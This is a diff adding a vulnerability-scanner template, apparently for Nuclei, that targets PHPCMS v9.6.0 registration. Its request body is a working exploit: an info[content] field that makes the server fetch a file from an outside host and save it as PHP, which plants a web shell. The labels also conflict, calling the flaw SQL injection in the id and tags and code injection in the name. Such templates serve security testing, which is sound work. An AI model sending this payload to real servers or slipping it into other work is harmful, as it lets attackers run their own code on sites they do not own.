@@ -1,0 +1,28 @@
+id: php9cms-sqli
+
+info:
+  name: phpcms v9.6.0代码注入漏洞
+  author: Str1am
+  severity: high
+  tags: phpcms,sqli
+
+requests:
+  - raw:
+      - |
+        POST /index.php?m=member&c=index&a=register&siteid=1 HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        siteid=1&modelid=1&username=qwerty&password=qwerty1&email=123456@qq.com&info[content]=<img src=http://7xusrl.com1.z0.glb.clouddn.com/bypassdog.txt?.php#.jpg>&dosubmit=1&protocol=
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "MySQL Error"
+          - "http"
+        part: body
+        condition: and
